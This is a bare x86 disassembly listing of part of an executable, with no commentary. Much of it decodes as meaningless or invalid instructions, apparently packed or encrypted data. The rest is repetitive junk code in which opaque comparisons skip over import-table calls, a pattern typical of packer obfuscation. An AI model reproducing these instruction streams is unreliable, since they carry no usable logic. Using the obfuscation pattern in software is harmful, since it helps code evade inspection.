  4017fe:	xchg   ebx,eax
  4017ff:	adc    eax,0xe36e58f7
  401804:	scas   al,BYTE PTR es:[edi]
  401805:	test   eax,0x7f02d5ee
  40180a:	addr16 sbb eax,0xda3ba0c6
  401810:	add    BYTE PTR [eax-0x2a],dh
  401813:	pop    esi
  401814:	bound  esi,QWORD PTR ds:0x6ec1fcd4
  40181a:	mov    ah,0x4b
  40181c:	inc    esp
  40181d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40181e:	cmp    eax,0xbf96b9b
  401823:	adc    BYTE PTR [esi],dh
  401825:	xor    DWORD PTR [ebp+0x5a146346],ebx
  40182b:	in     al,dx
  40182c:	xor    al,0xfe
  40182e:	fbld   TBYTE PTR [ebx]
  401830:	popf   
  401831:	les    esi,FWORD PTR [edx-0x496d4667]
  401837:	ins    BYTE PTR es:[edi],dx
  401838:	cmp    eax,0x2416e1de
  40183d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40183e:	js     0x4017c2
  401840:	push   edx
  401841:	dec    ebx
  401842:	fwait
  401843:	inc    ebx
  401844:	xchg   esi,eax
  401845:	cmp    al,0x84
  401847:	and    al,0xb6
  401849:	clc    
  40184a:	lods   eax,DWORD PTR ds:[esi]
  40184b:	mov    cl,0xd3
  40184d:	in     eax,0x64
  40184f:	lds    eax,FWORD PTR [ebp+esi*4+0x5b1889db]
  401856:	jns    0x40183d
  401858:	sbb    BYTE PTR [ecx+0x4d93f2e8],al
  40185e:	xor    BYTE PTR [eax],0x34
  401861:	call   0xe76ba695
  401866:	jp     0x401820
  401868:	call   0xef70aacb
  40186d:	std    
  40186e:	pop    eax
  40186f:	add    edx,DWORD PTR [esi]
  401871:	xchg   ebp,eax
  401872:	add    eax,0x14f1f620
  401877:	adc    al,BYTE PTR [ebx-0x533ec4b8]
  40187d:	mov    dl,0x50
  40187f:	add    esp,esp
  401881:	or     eax,0x74bcdc85
  401886:	and    eax,0x4c7e7c19
  40188b:	in     eax,dx
  40188c:	sbb    ecx,DWORD PTR [esi+ebx*4]
  40188f:	adc    ebp,eax
  401891:	cmp    eax,DWORD PTR [ecx]
  401893:	mul    al
  401895:	xchg   ebx,eax
  401896:	rcr    DWORD PTR [edi],0x61
  401899:	push   esp
  40189a:	cmovg  eax,DWORD PTR [eax]
  40189d:	scas   eax,DWORD PTR es:[edi]
  40189e:	xchg   ebp,eax
  40189f:	lock rcr DWORD PTR [edi+0x50d43339],cl
  4018a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018a7:	repnz enter 0x8a07,0xbf
  4018ac:	push   edi
  4018ad:	fild   QWORD PTR [ebx+0x364a4875]
  4018b3:	popa   
  4018b4:	xchg   edx,eax
  4018b5:	bnd ret 0x2b1e
  4018b9:	xor    BYTE PTR [ecx-0x270a3dbe],dh
  4018bf:	fwait
  4018c0:	inc    eax
  4018c1:	pushf  
  4018c2:	call   0xb94:0x8abfb1b5
  4018c9:	xchg   esi,eax
  4018ca:	push   0xffffffe2
  4018cc:	stos   BYTE PTR es:[edi],al
  4018cd:	xchg   esp,eax
  4018ce:	inc    ebx
  4018cf:	xchg   edx,eax
  4018d0:	push   es
  4018d1:	push   esp
  4018d2:	push   edx
  4018d3:	mov    ebx,0xe17cb85
  4018d8:	(bad)  
  4018da:	retf   0xc205
  4018dd:	(bad)  
  4018de:	es js  0x40195a
  4018e1:	push   ss
  4018e2:	pushf  
  4018e3:	mov    eax,ds:0xe6b27f7a
  4018e8:	jns    0x401954
  4018ea:	adc    eax,0x21e5eafc
  4018ef:	jle    0x40187f
  4018f1:	loope  0x401954
  4018f3:	xlat   BYTE PTR ds:[ebx]
  4018f4:	(bad)  
  4018f5:	retf   0x9250
  4018f8:	push   0x6a
  4018fa:	xor    al,0x26
  4018fc:	xchg   edi,eax
  4018fd:	fld    QWORD PTR [esi-0x4b]
  401900:	push   0xc3330716
  401905:	jp     0x401892
  401907:	pusha  
  401908:	aam    0xa5
  40190a:	cmp    eax,0x5681e4e7
  40190f:	mov    BYTE PTR [edx+0x677358d7],ch
  401915:	jmp    0x7dab:0x9af73993
  40191c:	gs hlt 
  40191e:	repz mov edx,0xb6b00772
  401924:	adc    eax,0x87cb2f20
  401929:	inc    ecx
  40192a:	mov    al,0x23
  40192c:	jmp    0x1997f3c7
  401931:	(bad)  
  401932:	pop    ebp
  401933:	sub    eax,edx
  401935:	mov    edx,0x31ab
  40193a:	mov    DWORD PTR [ebp-0x58],eax
  40193d:	sbb    ecx,edi
  40193f:	cmp    DWORD PTR ds:0x4282b7,0x0
  401946:	not    DWORD PTR ds:0x42832f
  40194c:	mov    edi,DWORD PTR ds:0x4281d3
  401952:	mov    DWORD PTR ds:0x4282cf,edi
  401958:	jmp    0x4019ab
  40195d:	mov    DWORD PTR ds:0x42833b,0x77e1
  401967:	not    edi
  401969:	cmp    DWORD PTR ds:0x4282b7,0x0
  401970:	jge    0x401993
  401976:	push   0x637b
  40197b:	call   DWORD PTR ds:0x428dbc
  401981:	mov    edx,DWORD PTR ds:0x4283d7
  401987:	adc    DWORD PTR ds:0x42833f,edx
  40198d:	and    edx,DWORD PTR ds:0x42828f
  401993:	add    DWORD PTR ds:0x4282bf,edx
  401999:	mov    edi,DWORD PTR ds:0x4281b3
  40199f:	xor    DWORD PTR ds:0x4281db,edi
  4019a5:	and    DWORD PTR ds:0x4281ab,ecx
  4019ab:	mov    DWORD PTR [ebp-0x54],ecx
  4019ae:	mov    ecx,DWORD PTR ds:0x4283bb
  4019b4:	sub    ecx,DWORD PTR ds:0x4282bb
  4019ba:	mov    DWORD PTR ds:0x4283bb,ecx
  4019c0:	or     DWORD PTR [ebp-0x58],0xca78b059
  4019c7:	sbb    DWORD PTR ds:0x4283cb,edx
  4019cd:	or     DWORD PTR [ebp-0x54],0x9c1b89e8
  4019d4:	adc    edx,edx
  4019d6:	lea    eax,[ebp+0x20]
  4019d9:	mov    DWORD PTR [ebp-0xc],eax
  4019dc:	mov    DWORD PTR ds:0x4283c3,0x339b
  4019e6:	mov    eax,ds:0x422410
  4019eb:	cmp    DWORD PTR ds:0x4282a7,0x0
  4019f2:	mov    edx,0x5699
  4019f7:	movzx  edx,BYTE PTR ds:0x4282b7
  4019fe:	mov    edi,0xa42
  401a03:	jmp    0x401a5a
  401a08:	not    edi
  401a0a:	mov    edi,0x2eea
  401a0f:	cmp    DWORD PTR ds:0x4282a7,0x0
  401a16:	jg     0x401a44
  401a1c:	push   0x3b91
  401a21:	push   0x4282c7
  401a26:	push   DWORD PTR [ebp-0x1c]
  401a29:	push   0x478c
  401a2e:	call   DWORD PTR ds:0x428ea8
  401a34:	adc    ecx,ecx
  401a36:	sbb    ecx,DWORD PTR ds:0x4281c7
  401a3c:	neg    edx
  401a3e:	adc    ecx,DWORD PTR ds:0x4281b7
  401a44:	sub    DWORD PTR ds:0x428343,ecx
  401a4a:	add    DWORD PTR ds:0x4281c3,0x4282bb
  401a54:	xor    edx,DWORD PTR ds:0x42832b
  401a5a:	mov    ecx,DWORD PTR [ebp-0xc]
  401a5d:	mov    eax,DWORD PTR [eax]
  401a5f:	add    eax,DWORD PTR [ecx]
  401a61:	sub    DWORD PTR ds:0x4281d3,edi
  401a67:	mov    edi,0x329e695d
  401a6c:	mov    DWORD PTR [ebp-0x14],eax
  401a6f:	inc    edx
  401a70:	mov    eax,DWORD PTR [ebp+0x18]
  401a73:	cmp    DWORD PTR ds:0x4281d3,0x0
  401a7a:	mov    edx,DWORD PTR ds:0x4282a7
  401a80:	mov    edx,0x3ce6
  401a85:	mov    DWORD PTR ds:0x42835f,0xa37
  401a8f:	jmp    0x401ae6
  401a94:	mov    DWORD PTR ds:0x4282ab,0x206f
  401a9e:	cmp    DWORD PTR ds:0x4281d3,0x0
  401aa5:	jg     0x401ac8
  401aab:	push   0x47a2
  401ab0:	push   0x8c73
  401ab5:	push   0x8ece
  401aba:	call   DWORD PTR ds:0x428dc0
  401ac0:	sub    edx,DWORD PTR ds:0x4283e3
  401ac6:	or     edx,ecx
  401ac8:	sub    ecx,0x6960
  401ace:	mov    ecx,DWORD PTR ds:0x4283cf
  401ad4:	adc    ecx,DWORD PTR ds:0x4281bf
  401ada:	mov    DWORD PTR ds:0x4283cf,ecx
  401ae0:	xor    edx,DWORD PTR ds:0x4281bb
  401ae6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401ae9:	shrd   eax,ecx,0x2
  401aed:	cmp    DWORD PTR ds:0x4281a3,0x0
  401af4:	mov    edx,0x4200
  401af9:	mov    DWORD PTR ds:0x4282b7,0x6ba0
  401b03:	mov    DWORD PTR ds:0x4281cf,0x1855
  401b0d:	jmp    0x401b6b
  401b12:	mov    DWORD PTR ds:0x4281af,0x2fa6
  401b1c:	cmp    DWORD PTR ds:0x4281a3,0x0
  401b23:	jge    0x401b53
  401b29:	push   DWORD PTR [ebp-0x28]
  401b2c:	push   DWORD PTR [ebp-0x20]
  401b2f:	push   0x672f
  401b34:	call   DWORD PTR ds:0x428f10
  401b3a:	movzx  edx,WORD PTR ds:0x4282df
  401b41:	and    edx,DWORD PTR ds:0x4281bb
  401b47:	mov    DWORD PTR ds:0x4282df,edx
  401b4d:	and    DWORD PTR ds:0x428297,edx
  401b53:	add    DWORD PTR ds:0x4283db,edx
  401b59:	sub    edx,DWORD PTR ds:0x4282e3
  401b5f:	add    DWORD PTR ds:0x42829b,edi
  401b65:	or     edx,DWORD PTR ds:0x4283c7
  401b6b:	shr    ecx,0x2
  401b6e:	mov    ecx,DWORD PTR [ebp+0x18]
  401b71:	cmp    DWORD PTR ds:0x42834b,0x0
  401b78:	mov    DWORD PTR ds:0x4282e3,0x3b05
  401b82:	mov    edx,0x7243
  401b87:	mov    DWORD PTR ds:0x4281b3,0x6e0d
  401b91:	jmp    0x401bec
  401b96:	mov    edx,0x2e5f
  401b9b:	mov    edx,DWORD PTR ds:0x428287
  401ba1:	cmp    DWORD PTR ds:0x42834b,0x0
  401ba8:	je     0x401be0
  401bae:	push   DWORD PTR [ebp-0x18]
  401bb1:	push   DWORD PTR [ebp-0x20]
  401bb4:	push   DWORD PTR [ebp-0x10]
  401bb7:	push   0x15fe
  401bbc:	push   0x400000
  401bc1:	call   DWORD PTR ds:0x428dd4
  401bc7:	sub    DWORD PTR ds:0x428337,ecx
  401bcd:	movzx  edx,WORD PTR ds:0x42829b
  401bd4:	add    DWORD PTR ds:0x428347,edx
  401bda:	add    DWORD PTR ds:0x42819f,ebx
  401be0:	sbb    DWORD PTR ds:0x42826f,edi
  401be6:	inc    DWORD PTR ds:0x42826f
  401bec:	mov    edx,DWORD PTR [ebp+0x1c]
  401bef:	xor    eax,edi
  401bf1:	xor    edx,edx
  401bf3:	or     DWORD PTR ds:0x4283d3,0x428277
  401bfd:	or     edx,eax
  401bff:	jmp    0x401fdd
  401c04:	xchg   ebp,eax
  401c05:	xchg   ecx,eax
  401c06:	je     0x401c58
  401c08:	ins    BYTE PTR es:[edi],dx
  401c09:	sub    al,0x2d
  401c0b:	dec    esp
  401c0c:	and    eax,0xe4b0afeb
  401c11:	mov    eax,0xa25beee
  401c16:	sbb    BYTE PTR [eax],bl
  401c18:	sahf   
  401c19:	adc    bl,BYTE PTR [eax]
  401c1b:	sbb    BYTE PTR [eax-0x7b07869f],dl
  401c21:	sbb    ebx,DWORD PTR [esi+eax*1+0x79]
  401c25:	stos   BYTE PTR es:[edi],al
  401c26:	dec    ecx
  401c27:	mov    ch,0x7d
  401c29:	jmp    0xe332:0x42eb70a3
  401c30:	jno    0x401c6a
  401c32:	jle    0x401c5f
  401c34:	push   edx
  401c35:	fstp   TBYTE PTR [eax-0x401b741a]
  401c3b:	lods   eax,DWORD PTR ds:[esi]
  401c3c:	in     eax,0x3a
  401c3e:	popa   
  401c3f:	xor    al,0x9
  401c41:	dec    edi
  401c42:	mov    edx,0x1f29b8b7
  401c47:	sub    bl,BYTE PTR [ecx+0x5e]
  401c4a:	and    DWORD PTR [ebx+ecx*4-0x5400df19],ebp
  401c51:	and    DWORD PTR [ebx],ebp
  401c53:	(bad)  
  401c54:	loope  0x401c2c
  401c56:	mov    esi,0xacb535e3
  401c5b:	lea    edx,[edi+0x30]
  401c5e:	lods   eax,DWORD PTR ds:[esi]
  401c5f:	mov    ds:0xe1a287e6,al
  401c64:	sbb    dh,ch
  401c66:	push   eax
  401c67:	inc    ebx
  401c68:	pop    ds
  401c69:	and    BYTE PTR [esi],dl
  401c6b:	add    DWORD PTR [ebp+0x22],edi
  401c6e:	mov    ch,BYTE PTR [edi-0x53a5a76d]
  401c74:	mov    DWORD PTR [esi-0x39181231],edi
  401c7a:	dec    ebp
  401c7b:	std    
  401c7c:	out    dx,eax
  401c7d:	mov    ah,0x5a
  401c7f:	in     al,dx
  401c80:	jno    0x401c18
  401c82:	das    
  401c83:	sar    DWORD PTR [esi+0x28],0x75
  401c87:	scas   al,BYTE PTR es:[edi]
  401c88:	push   ebx
  401c89:	les    edi,FWORD PTR [ebx-0x4e1cf327]
  401c8f:	ficom  WORD PTR [ecx+0x223371c9]
  401c95:	stc    
  401c96:	pop    ss
  401c97:	out    0xd3,eax
  401c99:	mov    esi,0x23b00743
  401c9e:	xchg   dh,ch
  401ca0:	loope  0x401c55
  401ca2:	mov    dl,BYTE PTR [esi+0x3b]
  401ca5:	fs inc esp
  401ca7:	cmp    eax,0xc9fba728
  401cac:	xchg   DWORD PTR [eax],ebp
  401cae:	pushf  
  401caf:	sbb    eax,0x155885b2
  401cb4:	xchg   ah,dh
  401cb6:	cmp    dl,bh
  401cb8:	repnz sbb ebx,DWORD PTR [eax+0x69]
  401cbc:	lea    ebx,[esi]
  401cbe:	std    
  401cbf:	fidivr DWORD PTR [edi]
  401cc1:	pusha  
  401cc2:	loope  0x401d31
  401cc4:	scas   eax,DWORD PTR es:[edi]
  401cc5:	sbb    BYTE PTR [esi+0x3f],0x20
  401cc9:	(bad)  
  401ccb:	cmp    al,0x48
  401ccd:	sbb    eax,0xd1e8d5b4
  401cd2:	sub    edi,DWORD PTR [edi]
  401cd4:	(bad)  
  401cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cd6:	js     0x401c63
  401cd8:	pop    es
  401cd9:	out    dx,eax
  401cda:	scas   al,BYTE PTR es:[edi]
  401cdb:	mov    al,ds:0x72b6ccd2
  401ce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ce1:	(bad)  
  401ce3:	and    DWORD PTR [edi-0x1d],0x273ff6c6
  401cea:	push   ds
  401ceb:	mov    ah,0xd7
  401ced:	inc    esp
  401cee:	jno    0x401d68
  401cf0:	dec    esp
  401cf1:	ja     0x401cee
  401cf3:	repz rcr DWORD PTR [esi+0x5fd2ddcc],cl
  401cfa:	ja     0x401cb3
  401cfc:	mov    dl,BYTE PTR [edx]
  401cfe:	dec    esi
  401cff:	test   DWORD PTR [ebx-0x24ce909b],ecx
  401d05:	jb     0x401d32
  401d07:	mov    eax,0x7abd174c
  401d0c:	scas   eax,DWORD PTR es:[edi]
  401d0d:	into   
  401d0e:	mov    edi,0x62fee310
  401d13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d14:	jmp    0x4afd:0x1d691bb3
  401d1b:	xlat   BYTE PTR ds:[ebx]
  401d1c:	jle    0x401d9c
  401d1e:	mov    esi,0x74cafc7c
  401d23:	rol    DWORD PTR ds:0xe0847143,0xeb
  401d2a:	pop    edx
  401d2b:	cwde   
  401d2c:	jae    0x401d43
  401d2e:	imul   esi,DWORD PTR [ebp+0x61216d0],0xccc833d2
  401d38:	jecxz  0x401d1c
  401d3a:	jno    0x401da7
  401d3c:	and    cl,dh
  401d3e:	(bad)  
  401d3f:	jecxz  0x401d47
  401d41:	add    DWORD PTR [ebx+ebp*2-0x771fe2df],esp
  401d48:	sub    DWORD PTR [ebx],0xffffffc4
  401d4b:	inc    esp
  401d4c:	or     cl,BYTE PTR [esp+ecx*2-0x45f095de]
  401d53:	das    
  401d54:	adc    cl,BYTE PTR ds:0xa53e50c0
  401d5a:	sbb    BYTE PTR [ebp+0x314cd2e],al
  401d60:	out    dx,eax
  401d61:	fdivr  DWORD PTR [edi+0x2ec2c337]
  401d67:	pop    ebx
  401d68:	xchg   ebx,eax
  401d69:	je     0x401d74
  401d6b:	xchg   DWORD PTR ds:[ecx+0x61ac7cf9],ebx
  401d72:	sub    BYTE PTR [ecx+0x1591f991],ah
  401d78:	sub    BYTE PTR [esi+0x33c24f02],ah
  401d7e:	add    al,0xce
  401d80:	xor    bl,BYTE PTR [edx-0x4ae76d6e]
  401d86:	in     al,dx
  401d87:	jne    0x401d56
  401d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d8a:	loope  0x401dca
  401d8c:	or     BYTE PTR [edx+eiz*2],ah
  401d8f:	or     al,dh
  401d91:	pusha  
  401d92:	bound  eax,QWORD PTR [esi]
  401d94:	mov    bh,0x48
  401d96:	lods   eax,DWORD PTR ds:[esi]
  401d97:	or     BYTE PTR [eax-0x3b],0x7e
  401d9b:	push   ebx
  401d9c:	or     BYTE PTR [edx+0x74890ce],dh
  401da2:	std    
  401da3:	jns    0x401d85
  401da5:	mov    ch,0x2a
  401da7:	dec    ebx
  401da8:	repz add cl,al
  401dab:	push   0x69422157
  401db0:	ins    DWORD PTR es:[edi],dx
  401db1:	les    ebx,FWORD PTR [edx-0x10]
  401db4:	inc    edx
  401db5:	lods   eax,DWORD PTR ds:[esi]
  401db6:	mov    BYTE PTR [ebx-0x73],ch
  401db9:	(bad)  
  401dba:	int3   
  401dbb:	aas    
  401dbc:	mov    bh,0xa7
  401dbe:	cld    
  401dbf:	call   0x4e12:0x32d2b980
  401dc6:	ror    bh,cl
  401dc8:	in     al,dx
  401dc9:	or     ch,BYTE PTR [eax]
  401dcb:	neg    bh
  401dcd:	xor    eax,0xe44d7ed0
  401dd2:	enter  0x5227,0xca
  401dd6:	mov    esi,0xe17e9115
  401ddb:	xchg   ebp,eax
  401ddc:	adc    cl,BYTE PTR [ebx]
  401dde:	sub    BYTE PTR [edx+0x79],dl
  401de1:	jge    0x401e58
  401de3:	mov    dh,0xc
  401de5:	cli    
  401de6:	fwait
  401de7:	pop    ecx
  401de8:	int    0x0
  401dea:	jge    0x401e41
  401dec:	sub    eax,DWORD PTR [edi+0x1d2e4bd]
  401df2:	iret   
  401df3:	sub    DWORD PTR [edx+0x16],0x5b
  401df7:	(bad)  
  401df8:	jmp    0x1a15bdb3
  401dfd:	mov    ebp,edi
  401dff:	jne    0x401dd7
  401e01:	pop    ebx
  401e02:	or     ebx,esi
  401e04:	mov    dh,bh
  401e06:	jnp    0x401d9c
  401e08:	shl    dl,1
  401e0a:	fdiv   DWORD PTR [edx-0x7a]
  401e0d:	jmp    0xfd32:0xfc1c9b0f
  401e14:	cmp    eax,0x32f8d600
  401e19:	int3   
  401e1a:	(bad)  
  401e1b:	scas   eax,DWORD PTR es:[edi]
  401e1c:	add    al,0xb7
  401e1e:	mov    ecx,esp
  401e20:	fcomp  DWORD PTR [edi+ebp*8-0x1efb3da7]
  401e27:	bound  esp,QWORD PTR [edx+0x5517d480]
  401e2d:	fcomp  DWORD PTR [edi-0x19]
  401e30:	or     dh,BYTE PTR [ebx+0x60]
  401e33:	xor    BYTE PTR [ebx+edi*2+0x66],ch
  401e37:	xchg   ecx,eax
  401e38:	or     bl,bl
  401e3a:	out    0x88,eax
  401e3c:	dec    ecx
  401e3d:	stos   BYTE PTR es:[edi],al
  401e3e:	sahf   
  401e3f:	mov    ebx,0xfcb0f067
  401e44:	cdq    
  401e45:	aaa    
  401e46:	jle    0x401ea7
  401e48:	(bad)  
  401e4a:	stos   DWORD PTR es:[edi],eax
  401e4b:	pop    esi
  401e4c:	adc    BYTE PTR [ebp+0x39],0x71
  401e50:	jp     0x401e29
  401e52:	out    0x3b,eax
  401e54:	push   eax
  401e55:	(bad)  
  401e56:	push   0x61
  401e58:	neg    DWORD PTR [esi+0x3fbcbd80]
  401e5e:	xor    eax,0xffffffd3
  401e61:	dec    edx
  401e62:	jl     0x401eaa
  401e64:	mov    al,ds:0x2f22f3c3
  401e69:	lods   eax,DWORD PTR ds:[esi]
  401e6a:	xchg   dl,bl
  401e6c:	sub    eax,0x1deaeb25
  401e71:	pop    esp
  401e72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e73:	push   ss
  401e74:	cmc    
  401e75:	cmp    ecx,DWORD PTR [eax+edi*2-0x3f]
  401e79:	mov    edi,esp
  401e7b:	pop    ds
  401e7c:	call   0xdd6b80f4
  401e81:	jae    0x401e7d
  401e83:	arpl   WORD PTR [eax+0x7e],ax
  401e86:	mov    ds:0x4becb51,eax
  401e8b:	pop    esi
  401e8c:	mov    ah,0x65
  401e8e:	add    al,0x7a
  401e90:	test   DWORD PTR [edi],0x36b6dea7
  401e96:	arpl   WORD PTR ds:0x8f55940,si
  401e9c:	out    dx,eax
  401e9d:	cmp    ebp,edi
  401e9f:	inc    edx
  401ea0:	cmp    eax,0x6460dfd2
  401ea5:	dec    edx
  401ea6:	outs   dx,DWORD PTR ds:[esi]
  401ea7:	out    0xf7,al
  401ea9:	ins    BYTE PTR es:[edi],dx
  401eaa:	push   edx
  401eab:	mov    ah,0xbf
  401ead:	and    BYTE PTR [edi+0x11265036],0xbd
  401eb4:	std    
  401eb5:	inc    edx
  401eb6:	mov    BYTE PTR [ebx+ebp*2-0x2b],0xc0
  401ebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ebc:	sbb    BYTE PTR [ebp+0xc],bl
  401ebf:	iret   
  401ec0:	dec    edx
  401ec1:	sub    esp,0xae2bced8
  401ec7:	retf   0x1e07
  401eca:	enter  0x6684,0xbd
  401ece:	shl    BYTE PTR [ecx],1
  401ed0:	or     BYTE PTR [edx+eiz*8],bh
  401ed3:	mov    al,ds:0x12dd48ab
  401ed8:	fst    DWORD PTR ss:[ebp+0x154a6abd]
  401edf:	adc    dh,BYTE PTR [edx+0x33]
  401ee2:	add    DWORD PTR [edi],edi
  401ee4:	or     al,0xc0
  401ee6:	push   es
  401ee7:	dec    ecx
  401ee8:	dec    edx
  401ee9:	and    al,0x4d
  401eeb:	pop    es
  401eec:	test   DWORD PTR [ebx+ebp*1+0x4611d3c8],ebx
  401ef3:	arpl   WORD PTR [edi-0x24],bx
  401ef6:	dec    ebp
  401ef7:	cmp    BYTE PTR [edi+0x24d3e5c3],ch
  401efd:	stos   BYTE PTR es:[edi],al
  401efe:	addr16 ja 0x401f1e
  401f01:	test   bh,ch
  401f03:	jbe    0x401f70
  401f05:	sub    BYTE PTR [ebx+eax*2+0x408823b5],0xd1
  401f0d:	(bad)  
  401f0f:	fist   WORD PTR [edx-0x4a]
  401f12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f13:	adc    cl,BYTE PTR [esi]
  401f15:	ja     0x401ed6
  401f17:	ins    DWORD PTR es:[edi],dx
  401f18:	je     0x401eda
  401f1a:	xchg   esp,eax
  401f1b:	lods   eax,DWORD PTR ds:[esi]
  401f1c:	(bad)  
  401f1d:	in     eax,0xa8
  401f1f:	pop    eax
  401f20:	mov    ds:0x1c041372,eax
  401f25:	push   ebx
  401f26:	jmp    0xe261f518
  401f2b:	mov    al,0x2
  401f2d:	jp     0x401edc
  401f2f:	out    dx,al
  401f30:	adc    al,0xdb
  401f32:	cwde   
  401f33:	sbb    DWORD PTR [ecx-0x35937b72],ecx
  401f39:	and    BYTE PTR [eax+0x19205860],bl
  401f3f:	fst    QWORD PTR [eax-0x13]
  401f42:	sub    ah,BYTE PTR ds:0x3291a0f6
  401f48:	out    dx,al
  401f49:	sub    al,0x43
  401f4b:	inc    edx
  401f4c:	shl    DWORD PTR ds:0x854bf8c7,0xe8
  401f53:	sbb    al,0xa1
  401f55:	(bad)  
  401f56:	mov    ds:0x2272496c,eax
  401f5b:	mov    edi,0x2ada081c
  401f60:	(bad)  
  401f62:	mov    ebp,0x33b6437e
  401f67:	mov    eax,0x90a1457f
  401f6c:	mov    ch,0x99
  401f6e:	pop    edi
  401f6f:	scas   eax,DWORD PTR es:[edi]
  401f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f71:	add    ch,BYTE PTR [edi+0xf]
  401f74:	sub    esi,DWORD PTR [esi+edi*2-0x51]
  401f78:	and    ecx,DWORD PTR [ebp+0x3d]
  401f7b:	dec    esi
  401f7c:	fimul  WORD PTR [esi+0x19]
  401f7f:	push   esi
  401f80:	mov    cl,0xc4
  401f82:	jmp    0x401f6b
  401f84:	mov    esp,0x65a584a0
  401f89:	dec    ecx
  401f8a:	and    al,0xcc
  401f8c:	cs call esi
  401f8f:	sbb    DWORD PTR [edi],ebp
  401f91:	inc    eax
  401f92:	and    al,0x92
  401f94:	jae    0x401fae
  401f96:	test   eax,0xafc5b43f
  401f9b:	ret    
  401f9c:	scas   al,BYTE PTR es:[edi]
  401f9d:	or     esp,DWORD PTR [edx-0x1a]
  401fa0:	push   edi
  401fa1:	fadd   QWORD PTR [esi+0x2edfca1b]
  401fa7:	icebp  
  401fa8:	adc    BYTE PTR [esi+edx*2-0x44b0b497],ch
  401faf:	out    dx,eax
  401fb0:	xchg   esp,eax
  401fb1:	daa    
  401fb2:	or     ebx,DWORD PTR [esi-0x23759f27]
  401fb8:	int    0x13
  401fba:	mov    ah,BYTE PTR [edx+0x59c796e3]
  401fc0:	dec    edi
  401fc1:	add    ecx,DWORD PTR [ebx]
  401fc3:	mov    edx,0x2792867e
  401fc8:	stc    
  401fc9:	push   es
  401fca:	jp     0x401ffb
  401fcc:	inc    eax
  401fcd:	fdiv   QWORD PTR [edx-0x48]
  401fd0:	leave  
  401fd1:	int3   
  401fd2:	xchg   esp,eax
  401fd3:	dec    ebp
  401fd4:	xor    eax,0xcfa7d934
  401fd9:	cmc    
  401fda:	outs   dx,DWORD PTR ds:[esi]
  401fdb:	cmp    DWORD PTR [ebx],ebx
  401fdd:	mov    DWORD PTR [ebp-0x3c],edx
  401fe0:	mov    DWORD PTR [ebp-0x70],0x2c55
  401fe7:	mov    eax,ds:0x4283ab
  401fec:	adc    DWORD PTR ds:0x4283e7,eax
  401ff2:	mov    DWORD PTR [ebp-0x6c],0x456f
  401ff9:	cmp    DWORD PTR ds:0x4283cb,0x0
  402000:	mov    DWORD PTR ds:0x4282cb,0x4df8
  40200a:	mov    DWORD PTR ds:0x4283b3,0x33aa
  402014:	jmp    0x402076
  402019:	mov    eax,0x569b
  40201e:	mov    eax,0x2370
  402023:	cmp    DWORD PTR ds:0x4283cb,0x0
  40202a:	jbe    0x40205c
  402030:	push   DWORD PTR [ebp-0xc]
  402033:	push   0x3ea9
  402038:	call   DWORD PTR ds:0x428dd8
  40203e:	or     DWORD PTR ds:0x4281af,0x6f29
  402048:	xor    DWORD PTR ds:0x42834b,0x42833f
  402052:	add    DWORD PTR ds:0x4282cb,0x428367
  40205c:	and    DWORD PTR ds:0x4283db,edi
  402062:	mov    DWORD PTR ds:0x4282bb,0x2a04
  40206c:	sub    DWORD PTR ds:0x4281db,0x42819b
  402076:	mov    DWORD PTR [ebp-0x70],0x78a6
  40207d:	cmp    DWORD PTR ds:0x42832f,0x0
  402084:	mov    DWORD PTR ds:0x42832b,ecx
  40208a:	mov    DWORD PTR ds:0x4281d7,0x59f
  402094:	mov    DWORD PTR ds:0x4281d7,ecx
  40209a:	mov    DWORD PTR ds:0x428357,0x5800
  4020a4:	jmp    0x402119
  4020a9:	mov    eax,0x445d
  4020ae:	cmp    DWORD PTR ds:0x42832f,0x0
  4020b5:	ja     0x4020ec
  4020bb:	push   0x4281ab
  4020c0:	push   DWORD PTR [ebp-0x10]
  4020c3:	push   0x842c
  4020c8:	call   DWORD PTR ds:0x428f14
  4020ce:	sbb    DWORD PTR ds:0x4283bb,0x4ff2
  4020d8:	xor    DWORD PTR ds:0x42833b,0x4282af
  4020e2:	adc    DWORD PTR ds:0x4283af,0x4c73
  4020ec:	add    DWORD PTR ds:0x4283af,0x4283df
  4020f6:	and    DWORD PTR ds:0x428197,0x4283b3
  402100:	sbb    DWORD PTR ds:0x42819b,0x5f9d
  40210a:	sbb    DWORD PTR ds:0x42832f,0x4282df
  402114:	sbb    eax,0x5252
  402119:	mov    DWORD PTR [ebp-0x6c],0x188
  402120:	neg    eax
  402122:	mov    DWORD PTR [ebp-0x70],0x5b3f
  402129:	mov    DWORD PTR [ebp-0x6c],0x3219
  402130:	mov    DWORD PTR [ebp-0x70],0x231c
  402137:	mov    eax,ds:0x42832b
  40213c:	add    DWORD PTR ds:0x4282c7,eax
  402142:	mov    DWORD PTR [ebp-0x6c],0x1337
  402149:	mov    eax,ds:0x4283bb
  40214e:	add    DWORD PTR ds:0x428357,eax
  402154:	mov    DWORD PTR [ebp-0x70],0x7593
  40215b:	cmp    DWORD PTR ds:0x4281a7,0x0
  402162:	mov    DWORD PTR ds:0x4283cb,0x750f
  40216c:	not    DWORD PTR ds:0x4283b3
  402172:	jmp    0x4021e4
  402177:	mov    DWORD PTR ds:0x4282ab,0x610f
  402181:	mov    eax,ds:0x4281bf
  402186:	cmp    DWORD PTR ds:0x4281a7,0x0
  40218d:	jle    0x4021c5
  402193:	push   0x4280a9
  402198:	push   DWORD PTR [ebp-0x28]
  40219b:	push   0x1818
  4021a0:	push   DWORD PTR [ebp-0x18]
  4021a3:	push   0x8e39
  4021a8:	push   DWORD PTR [ebp-0x1c]
  4021ab:	call   DWORD PTR ds:0x428eb0
  4021b1:	adc    DWORD PTR ds:0x4282cf,0x4282a3
  4021bb:	add    DWORD PTR ds:0x42828f,0x168f
  4021c5:	sub    DWORD PTR ds:0x428333,0x4281d3
